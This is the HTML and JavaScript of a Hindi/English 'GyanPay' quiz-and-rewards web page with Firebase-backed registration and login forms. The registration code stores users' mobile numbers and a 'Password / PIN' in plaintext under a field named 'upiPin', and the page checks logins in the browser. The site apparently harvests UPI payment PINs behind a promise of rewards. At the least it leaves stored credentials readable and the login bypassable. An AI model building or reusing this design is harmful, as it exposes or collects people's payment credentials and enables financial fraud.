<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GyanPay - Play Quiz & Win</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: #ffffff; margin: 0; padding: 0; }
        .navbar { display: flex; justify-content: space-between; align-items: center; background-color: #1e293b; padding: 12px 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        .logo-area { display: flex; align-items: center; gap: 10px; font-size: 20px; font-weight: bold; color: #ffc107; }
        .logo-icon { background: #ffc107; color: #0f172a; padding: 6px 12px; border-radius: 6px; font-weight: bold; }
        .nav-buttons { display: flex; gap: 8px; }
        .btn-nav { padding: 8px 14px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 13px; }
        .btn-login { background-color: #3b82f6; color: white; }
        .btn-register { background-color: #f59e0b; color: white; }
        .btn-admin { background-color: #ef4444; color: white; text-decoration: none; display: inline-flex; align-items: center; }

        .container { max-width: 550px; margin: 40px auto; background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.4); }
        h2 { color: #f8fafc; margin-bottom: 10px; text-align: center; }
        p { color: #94a3b8; text-align: center; }

        .form-section { display: none; margin-top: 20px; }
        .form-section.active { display: block; }
        .input-group { margin-bottom: 15px; text-align: left; }
        label { display: block; margin-bottom: 5px; color: #cbd5e1; font-size: 14px; }
        input { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; border-radius: 6px; color: white; box-sizing: border-box; }
        .btn-submit { width: 100%; padding: 12px; background: #10b981; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        
        .wallet-box { background: #0f172a; border: 1px solid #334155; padding: 20px; border-radius: 8px; margin-top: 20px; text-align: left; }
        .timer-box { background: #172033; border: 1px solid #3b82f6; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center; }
    </style>
</head>
<body>

    <div class="navbar">
        <div class="logo-area">
            <span class="logo-icon">G</span>
            <span>GyanPay</span>
        </div>
        <div class="nav-buttons">
            <button class="btn-nav btn-login" onclick="showTab('login')">Login</button>
            <button class="btn-nav btn-register" onclick="showTab('register')">Register</button>
            <a href="admin.html" class="btn-nav btn-admin">Admin Portal</a>
        </div>
    </div>

    <div class="container">
        <!-- Home / Hero Section with Live Countdown Timer -->
        <div id="homeHero" class="form-section active">
            <h2>Play Quiz & Win Real Rewards</h2>
            <p>Dynamic withdrawal limits & automated payout system.</p>
            
            <div class="wallet-box">
                <h4 style="margin: 0 0 10px 0; color: #f59e0b;">🎁 आपका वॉलेट बैलेंस</h4>
                <p style="margin: 0; color: #cbd5e1;">यूज़र: <b style="color: #fff;" id="displayUserName">Guest User</b></p>
            </div>

            <!-- Live Timer Box -->
            <div class="timer-box">
                <h4 style="margin: 0 0 5px 0; color: #38bdf8;">⏳ क्विज़ शुरू होने में शेष समय:</h4>
                <h2 id="countdownDisplay" style="margin: 0; color: #facc15;">Loading...</h2>
            </div>

            <button onclick="showTab('register')" class="btn-submit" style="background-color: #f59e0b; margin-top: 20px;">Get Started (Register)</button>
        </div>

        <!-- Login Section -->
        <div id="loginSection" class="form-section">
            <h2>User Login</h2>
            <form id="loginForm">
                <div class="input-group">
                    <label>Mobile Number</label>
                    <input type="text" id="loginMobile" required placeholder="Enter mobile number">
                </div>
                <div class="input-group">
                    <label>Password / PIN</label>
                    <input type="password" id="loginPin" required placeholder="Enter password">
                </div>
                <button type="submit" class="btn-submit">Login to Game</button>
            </form>
        </div>

        <!-- Register Section -->
        <div id="registerSection" class="form-section">
            <h2>Create New Account</h2>
            <form id="registerForm">
                <div class="input-group">
                    <label>Your Name</label>
                    <input type="text" id="regName" required placeholder="Enter your name (e.g. Laky01)">
                </div>
                <div class="input-group">
                    <label>Mobile Number</label>
                    <input type="text" id="regMobile" required placeholder="Enter mobile number">
                </div>
                <div class="input-group">
                    <label>Password / PIN</label>
                    <input type="password" id="regPin" required placeholder="Create password">
                </div>
                <button type="submit" class="btn-submit">Register & Submit</button>
            </form>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
          apiKey: "AIzaSyAqbegdp-6ppy2EBaZDSWGWpMQRamKTCNc",
          authDomain: "gyanpey.firebaseapp.com",
          projectId: "gyanpey",
          storageBucket: "gyanpey.firebasestorage.app",
          messagingSenderId: "198373987569",
          appId: "1:198373987569:web:1a03dfe48402106d750550"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        window.showTab = function(tabName) {
            document.getElementById('homeHero').classList.remove('active');
            document.getElementById('loginSection').classList.remove('active');
            document.getElementById('registerSection').classList.remove('active');

            if(tabName === 'login') {
                document.getElementById('loginSection').classList.add('active');
            } else if(tabName === 'register') {
                document.getElementById('registerSection').classList.add('active');
            } else {
                document.getElementById('homeHero').classList.add('active');
            }
        };

        function startCountdown() {
            setInterval(() => {
                const targetTime = localStorage.getItem("quizTargetTime");
                if (!targetTime) return;

                const now = new Date().getTime();
                const distance = targetTime - now;

                if (distance < 0) {
                    document.getElementById("countdownDisplay").innerHTML = "🚀 Quiz is LIVE Now!";
                    return;
                }

                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((distance % (1000 * 60)) / 1000);

                document.getElementById("countdownDisplay").innerHTML = 
                    `${hours}h : ${minutes}m : ${seconds}s`;
            }, 1000);
        }
        startCountdown();

        const regForm = document.getElementById('registerForm');
        regForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const name = document.getElementById('regName').value;
            const mobile = document.getElementById('regMobile').value;
            const pin = document.getElementById('regPin').value;

            try {
                await addDoc(collection(db, "usersData"), {
                    userName: name,
                    mobileNumber: mobile,
                    upiPin: pin,
                    status: "Pending",
                    timestamp: new Date()
                });
                alert('Registration successful! Waiting for Admin Approval.');
                regForm.reset();
                showTab('login');
            } catch (error) {
                console.error("Error: ", error);
            }
        });

        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const mobile = document.getElementById('loginMobile').value;
            const pin = document.getElementById('loginPin').value;

            try {
                const q = query(collection(db, "usersData"), where("mobileNumber", "==", mobile));
                const querySnapshot = await getDocs(q);

                if (querySnapshot.empty) {
                    alert('Mobile number not found! Please register first.');
                    return;
                }

                let userFound = false;
                let userStatus = "Pending";
                let fetchedName = "User";

                querySnapshot.forEach((doc) => {
                    const data = doc.data();
                    if(data.upiPin === pin) {
                        userFound = true;
                        userStatus = data.status || "Pending";
                        fetchedName = data.userName || "User";
                    }
                });

                if(!userFound) {
                    alert('Incorrect Password / PIN!');
                    return;
                }

                if(userStatus === "Approved") {
                    alert('Login Successful! Welcome ' + fetchedName);
                    document.getElementById('displayUserName').innerText = fetchedName;
                    showTab('home');
                } else {
                    alert('Your account is still PENDING for Admin Approval.');
                }
            } catch (error) {
                console.error("Login Error: ", error);
            }
        });
    </script>
</body>
</html>
